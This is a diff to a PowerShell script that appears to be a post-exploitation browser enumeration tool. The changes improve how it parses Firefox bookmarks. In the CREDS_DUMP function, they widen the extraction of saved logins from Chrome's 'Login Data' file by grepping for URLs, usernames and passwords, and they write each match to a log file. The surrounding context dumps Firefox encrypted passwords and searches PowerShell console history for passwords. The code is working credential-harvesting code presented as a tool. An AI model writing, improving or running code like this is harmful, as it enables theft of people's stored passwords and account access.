@@ -362,12 +362,12 @@ function FIREFOX {
         echo "Could not find any Bookmarks .." >> $LogFilePath\BrowserEnum.log
     }else{
         ## TODO: I cant use 'ConvertFrom-Json' cmdlet because it gives
-        # 'primitive JSON invalid error' parsing jsonlz4 to text|csv ...
+        # 'primitive JSON invalid error' parsing .jsonlz4 files to text|csv ...
         $Json = Get-Content "$Bookmarks_Path" -Raw
-        #$Regex = $Json -replace '[^a-zA-Z0-9/:.]','' # Replace all chars that does not match the Regex
-        $Regex = $Json -replace '.*_','' -replace '.*©','' -replace '.*®','' -replace '.*¯','' -replace '.*ø','' -replace '.*þ','' -replace '.*Š','' -replace '.*‡','' -replace '.*¼','' -replace '.*±','' -replace '.*§','' -replace '.*™','' -replace '.*†','' -replace '.*»','' -replace '.*¥',''
+        $Regex = $Json -replace '[^a-zA-Z0-9/:. ]','' # Replace all chars that does NOT match the Regex
+        #$Regex = $Json -replace '.*_','' -replace '.*©','' -replace '.*®','' -replace '.*¯','' -replace '.*ø','' -replace '.*þ','' -replace '.*Š','' -replace '.*‡','' -replace '.*¼','' -replace '.*±','' -replace '.*§','' -replace '.*™','' -replace '.*†','' -replace '.*»','' -replace '.*«','' -replace '.*☻','' -replace '.*♠','' -replace '.*↨','' -replace '.*▼','' -replace '.*¶','' -replace '.*♥','' -replace '.*♦','' -replace '.*☼','' -replace '.*♫','' -replace '.*◄','' -replace '.*↔','' -replace '.*°','' -replace '.*‰','' -replace '.*ï','' -replace '.*î','' -replace '.*ô','' -replace '.*↓','' -replace '.*æ','' -replace '.*►','' -replace '.*♣','' -replace '.*³',''
             ForEach ($Key in $Regex){
-                echo "$Key" >> $LogFilePath\BrowserEnum.log
+                echo "`n" $Key >> $LogFilePath\BrowserEnum.log
             }
         }
 }
@@ -577,20 +577,22 @@ function CREDS_DUMP {
         $Json.logins|select-object hostname,encryptedPassword >> $LogFilePath\BrowserEnum.log
     }
 
-    ## TODO: Retrieve Chrome Credentials (plain text)
+    ## Retrieve Chrome Credentials (plain text)
     echo "`n`n[ Chrome ]" >> $LogFilePath\BrowserEnum.log
-    echo "`nEnumerating LogIn Data Stored (plain text)" >> $LogFilePath\BrowserEnum.log
-    echo "------------------------------------------" >> $LogFilePath\BrowserEnum.log
+    echo "`nEnumerating LogIn Data" >> $LogFilePath\BrowserEnum.log
+    echo "----------------------" >> $LogFilePath\BrowserEnum.log
     If(-not(Test-Path "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data")){
         echo "None Credentials found .." >> $LogFilePath\BrowserEnum.log
     }else{
-        $Json = get-content "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"|select-string "http"
+        $Json = get-content "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"|select-string -pattern "http","user","passw","login"
         If(-not($Json) -or $Json -eq $null){
             echo "None Credentials found .." >> $LogFilePath\BrowserEnum.log
         }else{
-            $Regex = $Json -replace '[^a-zA-Z0-9/:.]','' # Replace all chars that does not match the Regex
-            echo "$Regex" >> $LogFilePath\BrowserEnum.log
-        }
+            ForEach ($Key in $Json){
+                $Regex = $Key -replace '[^a-zA-Z0-9/:. ]',''
+                echo $Regex >> $LogFilePath\BrowserEnum.log
+            }
+       }
     }
 
     ## Search for passwords in { ConsoleHost_history }
